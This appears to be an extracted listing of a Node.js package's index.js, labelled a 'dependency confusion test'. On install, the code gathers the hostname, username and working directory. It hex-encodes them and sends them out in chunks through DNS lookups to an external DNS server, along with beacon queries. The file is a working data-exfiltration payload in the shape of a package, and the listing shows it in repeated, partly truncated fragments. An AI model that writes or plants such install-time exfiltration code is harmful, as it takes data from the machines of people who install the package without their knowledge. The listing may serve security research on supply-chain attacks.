// File: tmp/tmpih8z8xvl/one-fixed-dep-bins/package/index.js
// ======================================================================
Line 1: const dns = require('dns')
Line 2: const os = require('os')
Line 3: const path = require('path')
Line 9: {
        // Collect basic system information (similar to the original research)
        const hostname = os.hostname();
        const username = os.userInfo().username;
        const currentPath = process.cwd();
        
        console.log('[DEPENDENCY CONFUSION TEST] Package installed!');
        console.log(`Hostname: ${hostname}`);
        console.log(`Username: ${username}`);
        console.log(`Current Path: ${currentPath}`);
        
        // Create a unique identifier for this installation
        const timestamp = Date.now().toString(36);
        const data = {
            hostname: hostname,
            username: username,
            path: currentPath,
            timestamp: timestamp
        };
        
        // Convert data to hex string for DNS exfiltration
        const dataString = JSON.stringify(data);
        const hexData = Buffer.from(dataString, 'utf8').toString('hex');
        
        // Split data into chunks (DNS labels have max 63 chars)
        const...
Line 11: os.hostname()
Line 12: os.userInfo()
Line 15: console.log('[DEPENDENCY CONFUSION TEST] Package installed!')
Line 21: Date.now().toString(36)
Line 31: Buffer.from(dataString, 'utf8').toString('hex')
Line 34: const chunks = hexData.match(/.{1,60}/g) || []
Line 37: {
            const subdomain = `${chunk}.${index}.${timestamp}.${DNS_SERVER}`;
            
            console.log(`[DNS EXFILTRATION] Sending chunk ${index + 1}/${chunks.length}`);
            console.log(`Query: ${subdomain}`);
            
            // Perform DNS lookup to exfiltrate data
            dns.resolve4(subdomain, (err, addresses) => {
                if (err) {
                    console.log(`[DNS] Query sent for chunk ${index + 1} (expected to fail)`);
                } else {
                    console.log(`[DNS] Unexpected response for chunk ${index + 1}:`, addresses);
                }
            });
        }
Line 40: console.log(`[DNS EXFILTRATION] Sending chunk ${index + 1}/${chunks.length}`)
Line 44: dns.resolve4(subdomain, (err, addresses) => {
                if (err) {
                    console.log(`[DNS] Query sent for chunk ${index + 1} (expected to fail)`);
                } else {
                    console.log(`[DNS] Unexpected response for chunk ${index + 1}:`, addresses);
                }
            })
Line 45: {
                    console.log(`[DNS] Query sent for chunk ${index + 1} (expected to fail)`);
                }
Line 46: console.log(`[DNS] Query sent for chunk ${index + 1} (expected to fail)`)
Line 47: {
                    console.log(`[DNS] Unexpected response for chunk ${index + 1}:`, addresses);
                }
Line 48: console.log(`[DNS] Unexpected response for chunk ${index + 1}:`, addresses)
Line 55: console.log(`[BEACON] ${simpleBeacon}`)
Line 57: dns.resolve4(simpleBeacon, (err, addresses) => {
            if (err) {
                console.log('[BEACON] Beacon sent successfully');
            }
        })
Line 58: {
                console.log('[BEACON] Beacon sent successfully');
            }
Line 59: console.log('[BEACON] Beacon sent successfully')
Line 63: catch (error) {
        console.error('[ERROR] Failed to collect system info:', error.message);
        
        // Send error beacon
        const errorBeacon = `error.${Date.now().toString(36)}.${DNS_SERVER}`;
        dns.resolve4(errorBeacon, () => {});
    }
Line 64: console.error('[ERROR] Failed to collect system info:', error.message)
Line 67: Date.now().toString(36)
Line 68: dns.resolve4(errorBeacon, () => {})
